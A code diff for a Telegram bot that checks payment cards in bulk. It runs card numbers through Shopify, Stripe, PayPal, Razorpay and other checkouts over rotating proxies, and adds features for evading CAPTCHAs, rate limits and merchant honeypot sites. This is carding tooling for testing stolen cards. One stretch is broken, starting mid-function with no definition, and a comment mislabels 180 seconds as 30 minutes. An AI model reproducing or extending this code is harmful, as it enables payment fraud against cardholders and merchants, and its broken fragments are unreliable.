@@ -12,6 +12,7 @@ from gates import (
     process_shopify_api_response,
     check_stripe_api,
     check_stripe_auth,
+    _pick_proxy, 
     check_paypal_charge,
     check_stripe5,
     check_authorize_net,
@@ -32,7 +33,7 @@ OWNER_ID = [5963548505, 5547897619]
 # ============================================================================
 # FREE GROUP CONFIGURATION
 # ============================================================================
-FREE_GROUP_ID = -1004293391598   # The group where free features apply
+FREE_GROUP_ID = -1003926435438   # The group where free features apply
 
 # ============================================================================
 # GLOBAL PLACEHOLDERS – set by setup_complete_handler (from app.py)
@@ -42,6 +43,11 @@ load_json_func = lambda key, default: default
 save_json_func = lambda key, data: None
 users_file = "users.json"
 user_sessions = {}
+
+# Global cooldown for sites that gave CAPTCHA (shared across all mass checks)
+CAPTCHA_COOLDOWN = {}
+CAPTCHA_COOLDOWN_LOCK = threading.Lock()
+CAPTCHA_COOLDOWN_SECONDS = 180   # 30 minutes
 
 # ============================================================================
 # RATE LIMITER
@@ -66,14 +72,16 @@ rate_limiter = RateLimiter()
 from telebot.apihelper import ApiTelegramException
 def safe_send(bot_func, *args, **kwargs):
     rate_limiter.wait()
-    while True:
+    max_retries = 3
+    for attempt in range(max_retries):
         try:
             return bot_func(*args, **kwargs)
         except ApiTelegramException as e:
             if e.error_code == 429:
                 retry_after = e.result_json.get('parameters', {}).get('retry_after', 5)
-                logging.warning(f"Rate limited (429). Waiting {retry_after}s")
-                time.sleep(retry_after)
+                sleep_time = min(retry_after, 10)
+                logging.warning(f"Rate limited (429). Waiting {sleep_time}s (capped from {retry_after})")
+                time.sleep(sleep_time)
                 rate_limiter.wait()
                 continue
             elif e.error_code in [400, 403]:
@@ -81,6 +89,185 @@ def safe_send(bot_func, *args, **kwargs):
                 return None
             else:
                 raise
+    return None
+
+
+import concurrent.futures as _cf
+
+# Global reusable pool — created once, never leaked
+_HARD_CAP_POOL = _cf.ThreadPoolExecutor(max_workers=200)
+
+def _hard_cap(fn, *args, timeout=30, default=False, **kwargs):
+    """Timeout via future.result — no thread leak (pool is reused)."""
+    try:
+        fut = _HARD_CAP_POOL.submit(fn, *args, **kwargs)
+        try:
+            return fut.result(timeout=timeout)
+        except _cf.TimeoutError:
+            return default
+        except Exception:
+            return default
+    except Exception:
+        return default
+
+# ============================================================================
+# UNIVERSAL PROXY PARSER
+# Accepts every common format → normalizes to "host:port:user:pass" or "host:port"
+# ============================================================================
+import re as _re_px
+
+_PX_SCHEME_RE = _re_px.compile(
+    r'^(https?|socks4|socks5|socks5h|socks)://(.+)$', _re_px.IGNORECASE
+)
+_PX_HOSTPORT_RE = _re_px.compile(r'^([\w.\-]+):(\d{1,5})$')
+_PX_IP_RE = _re_px.compile(r'^(\d{1,3}(?:\.\d{1,3}){3})$')
+
+
+def _px_scheme_to_protocol(scheme: str) -> str:
+    s = scheme.lower()
+    if s == 'socks':
+        return 'socks5'
+    return s
+
+
+def _px_valid_port(p: str) -> int:
+    try:
+        n = int(p)
+    except (ValueError, TypeError):
+        return 0
+    return n if 0 < n < 65536 else 0
+
+
+def _px_is_ipv4(s: str) -> bool:
+    return bool(_PX_IP_RE.match(s))
+
+
+def _px_is_hostish(s: str) -> bool:
+    """Hostname, IPv4, or domain-looking token."""
+    if not s or len(s) > 253:
+        return False
+    if _px_is_ipv4(s):
+        return True
+    # must contain a dot OR be a bare hostname (no spaces, no colons, no @)
+    if any(c in s for c in ' \t\r\n:@/'):
+        return False
+    return True
+
+
+def normalize_proxy(p):
+    """
+    Universal proxy normalizer.
+    Returns "host:port" or "host:port:user:pass" or None.
+
+    Handles all of:
+      IP:Port
+      IP:Port:User:Pass
+      User:Pass:IP:Port
+      IP:Port@User:Pass
+      User:Pass@IP:Port
+      http://IP:Port
+      http://User:Pass@IP:Port
+      https://User:Pass@IP:Port
+      socks4://IP:Port
+      socks4://User:Pass@IP:Port
+      socks5://IP:Port
+      socks5://User:Pass@IP:Port
+      socks5h://User:Pass@IP:Port
+      Hostname:Port
+      Hostname:Port:User:Pass
+      User:Pass:Hostname:Port
+      http://User:Pass@Hostname:Port
+    """
+    if not p or not isinstance(p, str):
+        return None
+
+    # strip whitespace, inline comments, surrounding quotes
+    s = p.strip().strip('"').strip("'").strip()
+    for sep in (' #', ' //', '\t#', ' ;'):
+        if sep in s:
+            s = s.split(sep)[0].strip()
+    if not s or s.startswith('#'):
+        return None
+
+    protocol = 'http'
+
+    # ---- 1) scheme prefix ----
+    m = _PX_SCHEME_RE.match(s)
+    if m:
+        protocol = _px_scheme_to_protocol(m.group(1))
+        s = m.group(2).strip()
+
+    # ---- 2) @ separator forms ----
+    if '@' in s:
+        left, right = s.rsplit('@', 1)
+        left, right = left.strip(), right.strip()
+
+        # figure out which side is host:port and which is creds
+        def _split_hostport(x):
+            if ':' not in x:
+                return None
+            h, _, pt = x.rpartition(':')
+            pt_n = _px_valid_port(pt)
+            if pt_n and _px_is_hostish(h):
+                return h, pt_n
+            return None
+
+        hp_right = _split_hostport(right)
+        hp_left  = _split_hostport(left)
+
+        if hp_right:                      # creds@host:port
+            host, port = hp_right
+            if ':' in left:
+                u, _, pw = left.partition(':')
+                return f"{host}:{port}:{u}:{pw}"
+            return f"{host}:{port}"
+
+        if hp_left:                       # host:port@creds
+            host, port = hp_left
+            if ':' in right:
+                u, _, pw = right.partition(':')
+                return f"{host}:{port}:{u}:{pw}"
+            return f"{host}:{port}"
+
+        return None  # malformed @-form
+
+    # ---- 3) colon-separated, no scheme, no @ ----
+    parts = s.split(':')
+
+    if len(parts) == 2:                   # host:port
+        host, port_s = parts
+        port = _px_valid_port(port_s)
+        if port and _px_is_hostish(host):
+            return f"{host}:{port}"
+        return None
+
+    if len(parts) == 4:
+        a, b, c, d = parts
+        a, b, c, d = a.strip(), b.strip(), c.strip(), d.strip()
+
+        b_port = _px_valid_port(b)
+        d_port = _px_valid_port(d)
+
+        # IP:Port:User:Pass  (b is port)
+        if b_port and _px_is_hostish(a):
+            return f"{a}:{b_port}:{c}:{d}"
+
+        # User:Pass:IP:Port  (d is port)
+        if d_port and _px_is_hostish(c):
+            return f"{c}:{d_port}:{a}:{b}"
+
+        return None
+
+    # ---- 4) odd cases (bare host or 3-part) ----
+    if len(parts) == 3:
+        # host:port:something — treat as malformed, skip
+        return None
+
+    if len(parts) == 1:
+        # bare IP/hostname with no port — reject (can't use without port)
+        return None
+
+    return None
 
 # ============================================================================
 # BACKGROUND HIT SENDER
@@ -136,6 +323,26 @@ def is_stop_requested(chat_id, user_id):
         key = get_stop_key(chat_id, user_id)
         return stop_events.get(key, False)
 
+
+def _quick_alive(proxy, timeout=8):
+    """Cheap TCP/HTTP test. Kills dead proxies in <4s."""
+    try:
+        parts = proxy.strip().split(':')
+        if len(parts) == 2:
+            url = f"http://{parts[0]}:{parts[1]}"
+        elif len(parts) == 4:
+            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        else:
+            return False
+        r = requests.get(
+            "http://api.ipify.org",
+            proxies={"http": url, "https": url},
+            timeout=timeout, verify=False
+        )
+        return r.status_code == 200
+    except Exception:
+        return False
+
 # ============================================================================
 # CONCURRENCY CONTROL
 # ============================================================================
@@ -158,43 +365,29 @@ MAX_CONCURRENT_CHECKS = 30
 mass_check_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKS)
 
 # ============================================================================
-# PROXY CACHE
+# PROXY CACHE – FAST VALIDATION (Google connectivity)
 # ============================================================================
 proxy_cache = {}
 proxy_cache_lock = threading.Lock()
-PROXY_CACHE_TTL = 300
-
-def check_proxy_live(proxy):
-    def _test():
-        try:
-            parts = proxy.strip().split(':')
-            if len(parts) == 2:
-                formatted = f"http://{parts[0]}:{parts[1]}"
-            elif len(parts) == 4:
-                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            else:
-                return None
-            proxies_dict = {'http': formatted, 'https': formatted}
-            r = requests.get("https://api.ipify.org/", proxies=proxies_dict, timeout=10, verify=False)
-            if r.status_code == 200:
-                return proxy
-        except:
-            pass
-        return None
-
-    with ThreadPoolExecutor(max_workers=1) as ex:
-        future = ex.submit(_test)
-        try:
-            return future.result(timeout=12)
-        except:
-            return None
+PROXY_CACHE_TTL = 600  # 10 minutes
 
 def validate_proxies_strict(proxies, bot, message):
+    """
+    FAST proxy validation using Google connectivity test (5s timeout, 100 threads).
+    Shows progress updates every few seconds so user knows it's working.
+    """
     if not proxies:
         return []
+
+    # Deduplicate
+    proxies = list(dict.fromkeys(proxies))
+    total = len(proxies)
+
     live_proxies = []
     now = time.time()
     to_test = []
+
+    # Check cache first
     with proxy_cache_lock:
         for p in proxies:
             if p in proxy_cache and now - proxy_cache[p]['time'] < PROXY_CACHE_TTL:
@@ -202,36 +395,63 @@ def validate_proxies_strict(proxies, bot, message):
                     live_proxies.append(p)
             else:
                 to_test.append(p)
+
     if not to_test:
         return live_proxies
-    total = len(to_test)
-    status_msg = safe_send(bot.send_message, message.chat.id, f"🛡️ Testing {total} proxies...", parse_mode='HTML')
+
+    # Send initial status message
+    status_msg = safe_send(bot.send_message, message.chat.id,
+        f"🛡️ Verifying {len(to_test)} proxies... (cached: {len(live_proxies)})",
+        parse_mode='HTML')
     tested = 0
     newly_live = []
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        future_to_proxy = {executor.submit(check_proxy_live, p): p for p in to_test}
-        for future in as_completed(future_to_proxy):
+    lock = threading.Lock()
+    last_update = time.time()
+
+    def test_proxy_connectivity(proxy):
+        """Test proxy with Google (fast, reliable)"""
+        try:
+            parts = proxy.strip().split(':')
+            if len(parts) == 2:
+                proxy_url = f"http://{parts[0]}:{parts[1]}"
+            elif len(parts) == 4:
+                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            else:
+                return False
+            proxies_dict = {'http': proxy_url, 'https': proxy_url}
+            # Use a fast, reliable endpoint
+            r = requests.get("https://www.google.com", proxies=proxies_dict, timeout=5, verify=False)
+            return r.status_code == 200
+        except:
+            return False
+
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(test_proxy_connectivity, p): p for p in to_test}
+        for future in as_completed(futures):
+            p = futures[future]
             tested += 1
-            try:
-                result = future.result(timeout=15)
-                p = future_to_proxy[future]
-                with proxy_cache_lock:
-                    proxy_cache[p] = {'live': bool(result), 'time': now}
-                if result:
+            ok = future.result()
+            with lock:
+                if ok:
                     newly_live.append(p)
-            except Exception:
-                p = future_to_proxy[future]
+                # Update cache
                 with proxy_cache_lock:
-                    proxy_cache[p] = {'live': False, 'time': now}
-            if tested % 10 == 0 and status_msg:
+                    proxy_cache[p] = {'live': ok, 'time': now}
+            # Update progress every 2 seconds or every 50 proxies
+            now_time = time.time()
+            if (now_time - last_update >= 2) or (tested % 50 == 0) or (tested == len(to_test)):
                 try:
                     safe_send(bot.edit_message_text,
-                        f"🛡️ Testing proxies: {tested}/{total}\n✅ Live: {len(live_proxies)+len(newly_live)}",
+                        f"🛡️ Verifying proxies: {tested}/{len(to_test)}\n✅ Live: {len(live_proxies)+len(newly_live)}",
                         message.chat.id, status_msg.message_id, parse_mode='HTML')
+                    last_update = now_time
                 except:
                     pass
+
+    # Delete status message
     if status_msg:
         safe_send(bot.delete_message, message.chat.id, status_msg.message_id)
+
     live_proxies.extend(newly_live)
     return live_proxies
 
@@ -497,94 +717,181 @@ def add_global_proxy(proxy, gate_type):
 def get_active_proxies(user_id, gate_type="shopify"):
     user_proxies = get_user_proxies(user_id)
     personal = user_proxies.get(gate_type, [])
+
     if personal:
         return personal
-    return get_global_proxies(gate_type)
+
+    # Get global proxies – first try gate-specific, then fallback to 'proxies'
+    global_data = get_global_proxies(gate_type)
+    if global_data:
+        return global_data
+
+    # If gate-specific empty, try to load the entire file and get 'proxies' key
+    raw = load_json_func("proxies.json", {"shopify": [], "razorpay": []})
+    fallback = raw.get('proxies', [])
+    if fallback:
+        return fallback
+
+    if isinstance(raw, dict) and 'proxies' in raw:
+        return raw['proxies']
+
+    return []
 
 # ============================================================================
 # PROXY TESTERS – Shopify & Razorpay
 # ============================================================================
+
 def test_proxy_for_shopify(proxy, test_cc="5242430428405662|03|28|323"):
     """
-    Test proxy for Shopify using the actual site pool.
-    - 403, 429, network errors -> FAIL
-    - CAPTCHA: test up to 3 different sites; if ALL return CAPTCHA -> FAIL
-    - Any other response (DECLINED, PROCESSING_ERROR, etc.) -> PASS
+    Full checkout test — accept ONLY if real decline/approval marker present.
+    Rejects: captcha, 429, 403, timeout, generic errors, unknown responses.
+    ~15s worst case per proxy.
     """
+    proxy = normalize_proxy(proxy)
+    if not proxy:
+        return False
+
+    # Stage 1: fast connectivity first
+    if not _quick_alive(proxy, timeout=5):
+        return False
+
     sites = get_filtered_sites_func()
     if not sites:
         return False
 
-    test_sites = random.sample(sites, min(3, len(sites)))
-    captcha_count = 0
-    success_count = 0
+    # One site only — fastest path
+    site_obj = random.choice(sites)
+    site = site_obj['url']
 
-    for site_obj in test_sites:
-        site = site_obj['url']
-        try:
-            api_resp = check_shopify_api(site, test_cc, proxy)
-            if not isinstance(api_resp, dict):
-                continue
-
-            status = api_resp.get('status', '')
-            msg = api_resp.get('Response', '').upper()
-
-            # ---- Network errors ----
-            if status == 'ERROR':
-                if any(k in msg.lower() for k in ['connection', 'timeout', 'unreachable', 'refused']):
-                    return False
-                if '403' in msg or 'FORBIDDEN' in msg:
-                    return False
-                if '429' in msg or 'RATE' in msg:
-                    return False
-                # Other errors (e.g., site-specific) – still proxy reached API, so pass
-                success_count += 1
-                continue
-
-            # ---- CAPTCHA ----
-            if 'CAPTCHA_REQUIRED' in msg or 'CAPTCHA' in msg:
-                captcha_count += 1
-                continue
-
-            # ---- Any other response (DECLINED, PROCESSING_ERROR, etc.) ----
-            success_count += 1
-
-        except Exception:
+    try:
+        api_resp = _hard_cap(
+            check_shopify_api, site, test_cc, proxy,
+            timeout=60, default=None
+        )
+        if not api_resp or not isinstance(api_resp, dict):
             return False
 
-    # If all tested sites returned CAPTCHA -> proxy is flagged, FAIL
-    if captcha_count > 0 and success_count == 0 and captcha_count == len(test_sites):
+        status = str(api_resp.get('status', '')).upper()
+        msg = str(api_resp.get('Response', '')).upper()
+        resp_upper = msg
+
+        # ── REJECT: captcha ──
+        if 'CAPTCHA' in resp_upper or api_resp.get('captcha_required'):
+            return False
+
+        # ── REJECT: rate limited ──
+        if any(k in resp_upper for k in (
+            '429', 'RATE LIMIT', 'RATE_LIMITED', 'TOO MANY REQUESTS'
+        )):
+            return False
+
+        # ── REJECT: proxy errors ──
+        if any(k in resp_upper for k in (
+            '503', '502', 'CONNECTION REFUSED', 'TIMEOUT',
+            'CONNECT TUNNEL FAILED', 'PROXY ERROR', 'UNREACHABLE'
+        )):
+            return False
+
+        # ── REJECT: generic errors / product fetch failed ──
+        if any(k in resp_upper for k in (
+            'API ERROR', 'PRODUCT FETCH FAILED', 'NO PRODUCT',
+            'SITE NOT FOUND', 'NOT A SHOPIFY', 'SYSTEM ERROR'
+        )):
+            return False
+
+        # ── ACCEPT: real gateway decline markers ──
+        decline_markers = [
+            'CARD_DECLINED',
+            'CARD DECLINED',
+            'FRAUD_SUSPECTED',
+            'FRAUD SUSPECTED',
+            'INSUFFICIENT_FUNDS',
+            'INSUFFICIENT FUNDS',
+            'INCORRECT_CVC',
+            'INCORRECT CVC',
+            'INCORRECT_ZIP',
+            'INCORRECT ZIP',
+            'DO_NOT_HONOR',
+            'DO NOT HONOR',
+            'EXPIRED_CARD',
+            'EXPIRED CARD',
+            'CARD_EXPIRED',
+            'LOST_CARD',
+            'STOLEN_CARD',
+            'PICK_UP_CARD',
+            'TRANSACTION_NOT_ALLOWED',
+            'CALL_ISSUER',
+            'PAYMENT_FAILED',
+            'GENERIC_ERROR',
+            'PROCESSING_ERROR',
+            'PAYMENTS_CREDIT_CARD_BASE_GENERIC',
+        ]
+        if any(k in resp_upper for k in decline_markers):
+            return True
+
+        # ── ACCEPT: real approvals (rare for test cards, but if seen, proxy works) ──
+        if 'ORDER_PLACED' in resp_upper or 'CHARGED' in resp_upper:
+            return True
+        if status in ('APPROVED', 'APPROVED_OTP'):
+            return True
+
+        # ── 3DS challenge = proxy reaches gateway ──
+        if any(k in resp_upper for k in (
+            '3DS', '3D_SECURE', '3DS_AUTHENTICATION',
+            'AUTHENTICATION_REQUIRED', 'OTP_REQUIRED'
+        )):
+            return True
+
+        # ── Anything else = reject ──
         return False
 
-    return success_count > 0
+    except Exception:
+        return False
 
 def test_proxy_for_razorpay(proxy, test_cc="5242430428405662|03|28|323"):
+    """Real Razorpay response only — no generic errors."""
+    proxy = normalize_proxy(proxy)
+    if not proxy:
+        return False
+
+    if not _quick_alive(proxy, timeout=5):
+        return False
+
     sites = load_rz_sites()
     if not sites:
         return False
 
-    test_sites = random.sample(sites, min(2, len(sites)))
+    site = random.choice(sites)
 
-    for site in test_sites:
-        try:
-            msg, status = check_razorpay(test_cc, proxy=proxy, site=site)
+    try:
+        result = _hard_cap(
+            check_razorpay, test_cc, proxy, site,
+            timeout=15, default=None
+        )
+        if not result or not isinstance(result, tuple) or len(result) != 2:
+            return False
 
-            if status == 'ERROR':
-                msg_lower = msg.lower()
-                if any(k in msg_lower for k in ['connection', 'timeout', 'unreachable', 'refused']):
-                    continue
-                if '403' in msg or 'forbidden' in msg_lower:
-                    return False
-                if '429' in msg or 'rate' in msg_lower:
-                    return False
-                return True
+        msg, status = result
+        msg_up = str(msg).upper()
 
+        # Reject captcha / rate limit / blocks
+        if any(k in msg_up for k in ('CAPTCHA', '429', 'BLOCKED', 'CHALLENGE')):
+            return False
+
+        # Accept only real declines or approvals
+        if status in ('DECLINED', 'APPROVED'):
+            # But confirm it's a real Razorpay response, not a generic error
+            if any(k in msg_up for k in (
+                'CONNECTION', 'TIMEOUT', 'UNREACHABLE', 'REFUSED',
+                'API ERROR', 'NOT FOUND'
+            )):
+                return False
             return True
 
-        except Exception:
-            continue
+        return False
 
-    return False
+    except Exception:
+        return False
 
 # ============================================================================
 # INLINE STOP BUTTON
@@ -711,9 +1018,145 @@ def safe_update_progress(bot, chat_id, status_msg, msg_text):
 
 # ============================================================================
 # SHOPIFY MASS CHECK – uses raw status from gate (no re‑classification)
+# ===========================================================================
+
+
+        e = _get_site_live(site_url)
+        e['probes_sent'] = e.get('probes_sent', 0) + 1
+        n = e['probes_sent']
+    return (n % FAKE_LUHN_PROBE_EVERY_N) == 0
+
+
+def _run_luhn_probe_on_site(site_obj, proxy, check_api_func, process_func):
+    site_url = site_obj['url']
+    import random as _r
+    probe = _luhn_bad_probe() if _r.random() < 0.6 else _expired_probe()
+    try:
+        api_resp = check_api_func(site_url, probe, proxy)
+        response_text, raw_status, _ = process_func(api_resp, site_obj.get('price', '0.00'))
+        up = response_text.upper()
+        if 'ORDER_PLACED' in up or 'CHARGED' in up or raw_status == 'APPROVED':
+            return True, f"Luhn probe approved → {response_text[:60]}"
+        return False, f"probe rejected ({response_text[:40]})"
+    except Exception as e:
+        return False, f"probe error: {str(e)[:60]}"
+
+
 # ============================================================================
+# SHOPIFY MASS CHECK — full corrected version
+# ============================================================================
+# ============================================================================
+# FAKE-SITE VELOCITY KILLER — module scope
+# ============================================================================
+import concurrent.futures as _cf
+
+FAKE_VELOCITY_COUNT          = 4       # cooks within window = fake
+FAKE_VELOCITY_WINDOW         = 60.0    # seconds
+FAKE_BAN_SECONDS             = 86400   # 24h blacklist
+CAPTCHA_SITE_BAN_SECONDS     = 180     # 3 min
+CAPTCHA_PROXY_BAN_SECONDS    = 180     # 3 min
+RATE_LIMIT_PROXY_BAN_SECONDS = 300     # 5 min
+_API_HARD_TIMEOUT            = 60      # seconds per API call
+OWNER_KILL_PING              = 5963548505
+
+_site_cook_times = {}
+_site_kill_lock  = threading.Lock()
+
+_proxy_ban      = {}
+_proxy_ban_lock = threading.Lock()
+
+
+def _safe_api_call(fn, *args, timeout=_API_HARD_TIMEOUT, **kwargs):
+    """Hard wall-clock timeout so no API call can hang the pool."""
+    ex = _cf.ThreadPoolExecutor(max_workers=1)
+    try:
+        fut = ex.submit(fn, *args, **kwargs)
+        try:
+            return fut.result(timeout=timeout)
+        except _cf.TimeoutError:
+            return None
+        except Exception:
+            return None
+    finally:
+        ex.shutdown(wait=False, cancel_futures=True)
+
+
+def _proxy_ban_set(proxy, seconds, reason=""):
+    with _proxy_ban_lock:
+        _proxy_ban[proxy] = {'until': time.time() + seconds, 'reason': reason}
+
+
+def _proxy_is_banned(proxy):
+    with _proxy_ban_lock:
+        e = _proxy_ban.get(proxy)
+        if not e:
+            return False
+        if e['until'] > time.time():
+            return True
+        del _proxy_ban[proxy]
+        return False
+
+
+def _observe_cook(site_url):
+    """
+    Register a cook for this site.
+    Returns (killed, count) — killed=True if velocity threshold crossed.
+    """
+    now = time.time()
+    with _site_kill_lock:
+        times = _site_cook_times.get(site_url, [])
+        cutoff = now - FAKE_VELOCITY_WINDOW
+        times = [t for t in times if t >= cutoff]
+        times.append(now)
+        _site_cook_times[site_url] = times
+        if len(times) >= FAKE_VELOCITY_COUNT:
+            _site_cook_times[site_url] = []
+            return True, len(times)
+    return False, 0
+
+
+def _remove_fake_site(bot, chat_id, site_obj, current_sites_ref, sites_lock):
+    """
+    Instant remove from live pool + blacklist + notify user + owner.
+    No confirmation. No ban table lookups.
+    """
+    site_url = site_obj['url']
+    site_id  = site_obj.get('id', '?')
+
+    # 1) Remove from live list
+    with sites_lock:
+        if site_obj in current_sites_ref:
+            current_sites_ref.remove(site_obj)
+
+    # 2) Blacklist for 24h (prevents re-entry mid-run)
+    with CAPTCHA_COOLDOWN_LOCK:
+        CAPTCHA_COOLDOWN[site_url] = time.time() + FAKE_BAN_SECONDS
+
+    # 3) Chat message (no domain shown)
+    try:
+        safe_send(bot.send_message, chat_id,
+                  f"🚫 Fake site removed (ID <code>{site_id}</code>) — "
+                  f"{FAKE_VELOCITY_COUNT} charges in {int(FAKE_VELOCITY_WINDOW)}s",
+                  parse_mode='HTML')
+    except Exception:
+        pass
+
+    # 4) Owner DM (with domain)
+    try:
+        safe_send(bot.send_message, OWNER_KILL_PING,
+                  f"🚨 <b>FAKE SITE REMOVED</b>\n"
+                  f"🆔 ID: <code>{site_id}</code>\n"
+                  f"🌐 <code>{site_url}</code>\n"
+                  f"📋 {FAKE_VELOCITY_COUNT} cooks in {int(FAKE_VELOCITY_WINDOW)}s",
+                  parse_mode='HTML')
+    except Exception:
+        pass
+
+
+
 def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
-                               user_id, load_json_func, save_json_func, users_file, hit_pref="both", dm_target_user_id=None):
+                               user_id, load_json_func, save_json_func, users_file,
+                               hit_pref="both", dm_target_user_id=None):
     original_count = len(ccs)
     ccs = remove_expired_cards(ccs)
     expired_skipped = original_count - len(ccs)
@@ -721,120 +1164,192 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
     if expired_skipped > 0:
         safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")
 
+    DECLINE_PATTERNS = [
+        "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
+        "PAYMENTS_CREDIT_CARD_BASE_GATEWAY_NOT_SUPPORTED",
+        "PAYMENTS_CREDIT_CARD_BASE_INVALID_START_DATE_OR_ISSUE_NUMBER_FOR_DEBIT",
+        "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
+        "PAYMENTS_CREDIT_CARD_FIRST_NAME_BLANK",
+        "PAYMENTS_CREDIT_CARD_LAST_NAME_BLANK",
+        "PAYMENTS_CREDIT_CARD_GENERIC",
+        "PAYMENTS_CREDIT_CARD_MONTH_INVALID_EXPIRY_MONTH",
+        "PAYMENTS_CREDIT_CARD_NUMBER_BLANK",
+        "PAYMENTS_CREDIT_CARD_NUMBER_INVALID",
+        "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
+        "PAYMENTS_CREDIT_CARD_SESSION_ID",
+        "PAYMENTS_CREDIT_CARD_SESSION_ID_INVALID",
+        "PAYMENTS_CREDIT_CARD_SESSION_ID_EXPIRED",
+        "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_BLANK",
+        "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE",
+        "PAYMENTS_CREDIT_CARD_YEAR_EXPIRED",
+        "PAYMENTS_CREDIT_CARD_YEAR_INVALID_EXPIRY_YEAR",
+        "INCORRECT_NUMBER", "INVALID_NUMBER", "INVALID_EXPIRY_DATE",
+        "EXPIRED_CARD", "INCORRECT_CVC", "INCORRECT_ZIP", "INCORRECT_ADDRESS",
+        "CARD_DECLINED", "PROCESSING_ERROR", "CALL_ISSUER", "PICK_UP_CARD",
+        "AUTHENTICATION_REQUIRED", "DO_NOT_HONOR", "FRAUD_SUSPECTED",
+        "LOST_CARD", "STOLEN_CARD", "CARD_TESTING", "MERCHANT_RULE",
+        "AMOUNT_TOO_LARGE", "AMOUNT_TOO_SMALL", "INVALID_CURRENCY",
+        "PAYMENT_METHOD_UNSUPPORTED"
+    ]
+
+    def is_decline_response(response_text):
+        upper = response_text.upper()
+        for pattern in DECLINE_PATTERNS:
+            if pattern in upper:
+                return True
+        if 'DECLINED' in upper: return True
+        if 'INSUFFICIENT' in upper and 'FUNDS' in upper: return True
+        if 'INCORRECT' in upper and any(k in upper for k in ('CVC','CVV','ZIP','ADDRESS')): return True
+        if 'EXPIRED' in upper and 'CARD' in upper: return True
+        if 'DO NOT HONOR' in upper: return True
+        if 'FRAUD' in upper: return True
+        return False
+
     send_every_hit = (get_user_preference(user_id) == "individual")
     total = len(ccs)
     results = {"cooked": [], "approved": [], "dead": [], "expired": [], "error": []}
     sites_lock = threading.Lock()
     temp_site_ban = {}
-    TEMP_BAN_TIME = 120
+    TEMP_BAN_TIME = 600
     current_sites = site_list.copy()
-    current_proxies = proxies.copy()
+    current_proxies = [p for p in proxies if not _proxy_is_banned(p)]
+
+    # Reset velocity trackers for this run
+    with _site_kill_lock:
+        for s in current_sites:
+            _site_cook_times.pop(s['url'], None)
+
     clear_stop(chat_id, user_id)
     unchecked_ccs = []
     stopped = False
     last_response = None
+    last_error_reason = None
     status_msg = start_msg
+
+    # ---- Site cooldown helpers ----
+    def is_site_on_cooldown(site_url):
+        with CAPTCHA_COOLDOWN_LOCK:
+            return CAPTCHA_COOLDOWN.get(site_url, 0) > time.time()
+
+    def mark_site_cooldown(site_url, seconds):
+        with CAPTCHA_COOLDOWN_LOCK:
+            CAPTCHA_COOLDOWN[site_url] = time.time() + seconds
 
     def error_result(cc, reason):
         return {
             'cc': cc, 'response': reason, 'status': 'ERROR', 'gateway': 'Unknown',
             'price': '0.00', 'site': 'N/A', 'site_url': 'N/A', 'site_obj': {},
             'proxy_used': None,
-            'bin_info': get_bin_info(cc.split('|')[0]), 'timestamp': datetime.now().isoformat()
+            'bin_info': get_bin_info(cc.split('|')[0]),
+            'timestamp': datetime.now().isoformat()
         }
 
-    def check_card_concurrent(cc, site_list, proxy_list, max_retries=3):
-        nonlocal last_response
+    # ------------------------------------------------------------------
+    # Per-card worker
+    # ------------------------------------------------------------------
+    def check_card_concurrent(cc, site_list, proxy_list, max_attempts=1):
+        nonlocal last_response, last_error_reason
         if is_stop_requested(chat_id, user_id):
             return error_result(cc, "Stopped by user"), True
 
-        available_proxies = list(proxy_list)
-        tried_sites = set()
-
-        for _ in range(max_retries):
-            if is_stop_requested(chat_id, user_id):
-                return error_result(cc, "Stopped by user"), True
-
-            with sites_lock:
-                now = time.time()
-                candidates = []
-                for s in site_list:
-                    url = s['url']
-                    if url in temp_site_ban and now < temp_site_ban[url]:
-                        continue
-                    if url not in tried_sites:
-                        candidates.append(s)
-                if not candidates:
-                    break
-                site_obj = random.choice(candidates)
-                site_url = site_obj['url']
-                site_name = site_obj.get('name', site_url)
-                price = site_obj.get('price', '0.00')
-                gateway = site_obj.get('gateway', 'Unknown')
-
-            tried_sites.add(site_url)
-
-            while available_proxies:
-                if is_stop_requested(chat_id, user_id):
-                    return error_result(cc, "Stopped by user"), True
-
-                proxy = random.choice(available_proxies)
-                try:
-                    api_resp = check_shopify_api(site_url, cc, proxy)
-                    response_text, raw_status, gateway_result = process_shopify_api_response(api_resp, price)
-                    last_response = response_text
-
-                    # Use raw_status directly – no re‑classification
-                    final_status = raw_status
-                    if final_status == 'APPROVED_OTP':
-                        final_status = 'APPROVED'
-
-                    # If we got a valid gateway response (not ERROR), return it
-                    if final_status != 'ERROR':
-                        bin_info = get_bin_info(cc.split('|')[0])
-                        return {
-                            'cc': cc,
-                            'response': response_text,
-                            'status': final_status,
-                            'gateway': gateway_result or gateway,
-                            'price': price,
-                            'site': site_name,
-                            'site_url': site_url,
-                            'site_obj': site_obj,
-                            'proxy_used': proxy,
-                            'bin_info': bin_info,
-                            'timestamp': datetime.now().isoformat()
-                        }, False
-
-                    # If ERROR, remove this proxy and ban site temporarily
-                    if proxy in available_proxies:
-                        available_proxies.remove(proxy)
-                    with sites_lock:
-                        temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
-                    break  # try next site
-
-                except Exception as e:
-                    if proxy in available_proxies:
-                        available_proxies.remove(proxy)
+        # ---- Pick initial site ----
+        with sites_lock:
+            now = time.time()
+            candidates = []
+            for s in site_list:
+                url = s['url']
+                if url in temp_site_ban and now < temp_site_ban[url]:
                     continue
+                if is_site_on_cooldown(url):
+                    continue
+                candidates.append(s)
+            if not candidates:
+                return error_result(cc, "all sites on cooldown/ban"), False
+            site_obj = random.choice(candidates)
+            site_url = site_obj['url']
+            site_name = site_obj.get('name', site_url)
+            price = site_obj.get('price', '0.00')
+            gateway = site_obj.get('gateway', 'Unknown')
 
-            continue
